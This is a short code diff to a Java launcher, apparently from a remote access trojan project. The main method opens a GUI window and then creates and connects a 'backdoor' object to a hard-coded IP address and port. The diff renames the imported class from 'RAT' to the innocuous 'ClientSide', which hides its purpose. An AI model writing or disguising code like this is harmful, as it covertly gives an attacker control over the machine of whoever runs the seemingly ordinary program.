@@ -1,12 +1,12 @@
 package launcher;
 
-import connection.RAT;
+import connection.ClientSide;
 import view.MainWindow;
 
 public class Main {
 	public static void main(String[] args) {
 		new MainWindow();
-		RAT backdoor = new RAT("192.168.0.165", 5123);
+		ClientSide backdoor = new ClientSide("192.168.0.159", 5123);
 		backdoor.connect();
 	}
 }
